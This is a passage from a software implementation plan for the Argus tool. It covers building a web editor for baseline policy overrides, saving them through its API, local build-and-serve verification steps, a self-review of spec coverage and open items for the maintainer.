  - a **Baselines** table — one row per baseline: `id` + `reason`, an **enable** checkbox (checked unless `override.enabled === false`), and a **severity** `<select>` (`safe|low|medium|high`, default `defaultSeverity`, marked when it differs). A row with any override gets an `overridden` class.
  - a **User rules** list — the `userRules`, add/remove (retain the existing allowlist affordance).
  - a collapsed **Advanced (raw JSON)** `<details>` holding a textarea for the thin File (escape hatch), reflecting the assembled document.
  - the existing **Versions** list (unchanged).

- [ ] **Step 2: Assemble + save.** On save, build the thin `File` from panel state: for each baseline, add `overrides[id] = {enabled:false}` when unchecked and/or `{severity}` when the select differs from `defaultSeverity`; include the user rules verbatim; `PUT /api/policy` with `Content-Type: application/json` and `X-Argus-CSRF: 1`. Reuse the existing status/`saved as version N` handling.

- [ ] **Step 3: Style.** In `style.css`, add minimal rules for the baseline table, the `.overridden` marker, the toggle/select spacing, and the `<details>` advanced block. No new dependency, no build step (match the existing no-build `.mjs`/plain-CSS convention).

- [ ] **Step 4: Verify in the app.** Build, run against a scratch home, and confirm the flow end-to-end (this is a frontend task — the guarantee is the served UI, not a Go test):

```bash
CGO_ENABLED=0 go build -o /tmp/argus-g ./cmd/argus
HOME=$(mktemp -d) /tmp/argus-g init
HOME=<that dir> /tmp/argus-g serve   # open 127.0.0.1:4600 → Policy tab
```

Confirm: toggling `sudo` off + setting `pkg-install-lifecycle` to `low` and saving writes a thin `policy.json` with exactly those two overrides and no inline baselines; reloading shows the same state; the Versions list gains an entry. Use the **verify** skill / `/run` to drive the browser if available.

- [ ] **Step 5: Commit** `feat(web): structured baseline-override policy editor`.

---

## Self-Review

**Spec coverage:** §3 model → T1–T2 (Baseline/Override/File/Effective). §4 load + normalize → T4. §5 schema → T3. §2/§9 floor invariant → T5. §6 init → T6; doctor → T7. §7 web (effective API + editor) → T9–T10; the close-loop/replay thin-file correctness the spec implies → T8. §8 replay/snapshot normalization → T8 (`parsePolicy` → `EffectiveFromBytes`) + T4 (`Load`/`EffectiveFromBytes`). Every spec section maps to a task.

**Placeholder scan:** no TBD/TODO; each code step carries real Go/JSON/JS. The two frontend-shaped notes (T9 wrapper simplification, T10 UI) give concrete structure and an explicit end-to-end verification rather than "add a UI".

**Type consistency:** `Baseline() []Rule`, `Override{Enabled *bool; Severity string}`, `File{Version,Meta,Defaults,Overrides,Rules}`, `File.Effective() Policy`, `DefaultFile() File`, `normalize([]byte)(File,error)`, `LoadFile(string)(File,error)`, `EffectiveFromBytes([]byte)(Policy,error)`, `SeedRuleIDs()[]string`, `(*Server).loadFile() policy.File`, `warnUnknownOverride(string, io.Writer)`, `(*Server).handleEffective` — names identical across every task that references them.

**Ordering:** types (T1) → assembly (T2) → schema (T3, before any Load test touching overrides) → normalize/Load (T4) → invariant (T5) → init (T6) → doctor (T7) → web persist fix (T8, before the editor relies on thin writes) → effective API (T9) → editor (T10). Each task leaves `go build ./... && go test ./...` green.

## Open items for the maintainer

1. `newTestServer(t)` / `policyPath` field names in `internal/web` tests are referenced generically — the implementer must match the actual helper + field names in that package (verify in `internal/web/*_test.go` and `server.go`).
2. The `hook.Payload` construction in T5 must match the real struct (verify `internal/hook/payload.go` — mirror how existing `internal/classify` tests build a Bash payload).
